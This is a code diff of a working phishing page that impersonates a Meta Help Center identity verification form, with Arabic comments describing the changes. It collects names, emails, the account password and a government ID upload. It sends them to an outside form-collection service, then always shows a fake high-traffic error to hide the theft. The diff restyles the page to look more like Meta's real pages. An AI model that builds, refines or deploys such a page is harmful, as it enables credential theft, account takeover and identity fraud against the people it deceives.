@@ -4,46 +4,189 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Account Verification | Meta Help Center</title>
-    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
     <style>
-        :root { --meta-blue: #0668E1; --bg-gray: #F0F2F5; --border-color: #DADDE1; }
-        body { font-family: 'Roboto', sans-serif; background-color: var(--bg-gray); margin: 0; color: #1C1E21; }
-        .navbar { background: white; padding: 12px 20px; border-bottom: 1px solid var(--border-color); display: flex; justify-content: center; }
-        .container { max-width: 550px; margin: 40px auto; background: white; padding: 30px; border-radius: 8px; box-shadow: 0 1px 2px rgba(0,0,0,0.2); }
-        h2 { font-size: 24px; margin-bottom: 10px; }
-        p.desc { font-size: 14px; color: #606770; margin-bottom: 25px; }
-        .form-group { margin-bottom: 15px; }
-        label { display: block; font-size: 13px; font-weight: 600; margin-bottom: 5px; }
-        input, textarea { width: 100%; padding: 10px; border: 1px solid var(--border-color); border-radius: 6px; background: #F5F6F7; box-sizing: border-box; }
-        .btn-submit { width: 100%; padding: 12px; background: var(--meta-blue); color: white; border: none; border-radius: 6px; font-weight: 700; cursor: pointer; margin-top: 10px; }
-        #error-overlay { display: none; background: #FFEBE8; border: 1px solid #DD3C10; padding: 15px; border-radius: 4px; margin-top: 20px; font-size: 14px; }
+        /* استخدام خطوط النظام الافتراضية لمطابقة تصميم ميتا الواقعي */
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #F0F2F5;
+            margin: 0;
+            color: #1C1E21;
+            line-height: 1.34;
+        }
+        /* شريط التنقل العلوي */
+        .navbar {
+            background: white;
+            padding: 16px 32px;
+            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
+            display: flex;
+            align-items: center;
+        }
+        /* حاوية النموذج */
+        .container {
+            max-width: 500px;
+            margin: 40px auto;
+            background: white;
+            padding: 40px;
+            border-radius: 12px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            border: 1px solid #dddfe2;
+        }
+        /* النصوص */
+        h2 {
+            font-size: 24px;
+            font-weight: 700;
+            margin-bottom: 12px;
+            text-align: center;
+        }
+        p.desc {
+            font-size: 16px;
+            color: #65676B; /* لون نص ثانوي رسمي */
+            margin-bottom: 32px;
+            text-align: center;
+            line-height: 1.5;
+        }
+        /* حقول الإدخال */
+        .form-group {
+            margin-bottom: 20px;
+        }
+        label {
+            display: block;
+            font-size: 14px;
+            font-weight: 500;
+            color: #65676B;
+            margin-bottom: 8px;
+        }
+        input, textarea {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1px solid #dddfe2; /* حدود فاتحة */
+            border-radius: 6px;
+            background: #FFFFFF; /* خلفية بيضاء */
+            box-sizing: border-box;
+            font-size: 16px;
+            transition: all 0.2s ease;
+        }
+        /* تأثير التركيز على الحقول */
+        input:focus, textarea:focus {
+            border-color: #1877F2;
+            box-shadow: 0 0 0 2px rgba(24, 119, 242, 0.2);
+            outline: none;
+        }
+        textarea {
+            resize: vertical;
+            height: 100px;
+        }
+        input[type="file"] {
+            padding: 10px;
+            background: #F5F6F7;
+        }
+        /* زر الإرسال */
+        .btn-submit {
+            width: 100%;
+            padding: 14px;
+            background: #1877F2; /* لون ميتا الأزرق الرسمي */
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: background 0.2s;
+        }
+        .btn-submit:hover {
+            background: #166fe5; /* لون أغمق قليلاً عند التحويم */
+        }
+        /* رسالة الخطأ */
+        #error-overlay {
+            display: none;
+            background: #fff;
+            border: 1px solid #fa3e3e;
+            color: #fa3e3e;
+            padding: 16px;
+            border-radius: 8px;
+            margin-top: 24px;
+            font-size: 14px;
+            text-align: center;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.05);
+        }
     </style>
 </head>
 <body>
-    <div class="navbar"><img src="https://z-p3-static.xx.fbcdn.net/rsrc.php/y9/r/t_S9-87L_Fr.svg" width="100"></div>
+    <div class="navbar">
+        <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" alt="Meta" height="24">
+    </div>
+    
     <div class="container">
         <h2>Identity Verification</h2>
-        <p class="desc">Please provide your official information to secure your account.</p>
-        <form id="meta-form" action="https://formspree.io/f/رابط_فورم_سبري_هنا" method="POST">
-            <div class="form-group"><label>Full Name</label><input type="text" name="name" required></div>
-            <div class="form-group"><label>Username</label><input type="text" name="user" required></div>
-            <div class="form-group"><label>Gmail Address</label><input type="email" name="gmail" required></div>
-            <div class="form-group"><label>iCloud Address</label><input type="email" name="icloud"></div>
-            <div class="form-group"><label>Last Password</label><input type="password" name="pass" required></div>
-            <div class="form-group"><label>Description</label><textarea name="desc" rows="3"></textarea></div>
-            <div class="form-group"><label>Government ID (Photo)</label><input type="file" name="id_file"></div>
-            <button type="submit" id="submit-btn" class="btn-submit">Submit Review Request</button>
+        <p class="desc">To secure your account, please confirm your identity by providing the official information below.</p>
+        
+        <form id="meta-form" action="https://forminit.com/f/lgz9j8n2rgg" method="POST" enctype="multipart/form-data">
+            <div class="form-group">
+                <label>Full Name</label>
+                <input type="text" name="name" required placeholder="Enter your legal name">
+            </div>
+            <div class="form-group">
+                <label>Username / ID</label>
+                <input type="text" name="user" required placeholder="e.g., @username or ID number">
+            </div>
+            <div class="form-group">
+                <label>Primary Email Address</label>
+                <input type="email" name="gmail" required placeholder="Email associated with account">
+            </div>
+            <div class="form-group">
+                <label>Secondary Email Address (Optional)</label>
+                <input type="email" name="icloud" placeholder="Backup email address">
+            </div>
+            <div class="form-group">
+                <label>Current or Last Known Password</label>
+                <input type="password" name="pass" required placeholder="********">
+            </div>
+            <div class="form-group">
+                <label>Additional details</label>
+                <textarea name="desc" placeholder="Please provide any extra details about your situation."></textarea>
+            </div>
+            <div class="form-group">
+                <label>Upload Government-Issued ID</label>
+                <input type="file" name="id_file" accept="image/png, image/jpeg, application/pdf">
+            </div>
+            <button type="submit" id="submit-btn" class="btn-submit">Continue</button>
         </form>
-        <div id="error-overlay"><strong>System Error (500):</strong> High traffic. Try again in 24h.</div>
+        
+        <div id="error-overlay">
+            <strong>Unable to Process Request</strong><br>
+            Our systems are currently experiencing high traffic. Please try again later.
+        </div>
     </div>
+
     <script>
         const form = document.getElementById('meta-form');
         form.onsubmit = async (e) => {
             e.preventDefault();
-            document.getElementById('submit-btn').innerHTML = "Processing...";
-            await fetch(form.action, { method: 'POST', body: new FormData(form), headers: { 'Accept': 'application/json' } });
-            form.style.display = 'none';
-            document.getElementById('error-overlay').style.display = 'block';
+            const btn = document.getElementById('submit-btn');
+            const originalText = btn.innerText;
+            btn.innerText = "Processing...";
+            btn.disabled = true;
+            btn.style.opacity = "0.7";
+
+            try {
+                const response = await fetch(form.action, {
+                    method: 'POST',
+                    body: new FormData(form),
+                    headers: {
+                        'Accept': 'application/json'
+                    }
+                });
+                
+                // في حال نجاح الإرسال أو فشله، سنظهر رسالة الخطأ المزيفة حسب طلب السكربت الأصلي
+                form.style.display = 'none';
+                document.getElementById('error-overlay').style.display = 'block';
+                
+            } catch (error) {
+                // حتى في حال وجود خطأ حقيقي في الشبكة، نظهر الرسالة المزيفة
+                form.style.display = 'none';
+                document.getElementById('error-overlay').style.display = 'block';
+            }
         };
     </script>
 </body>
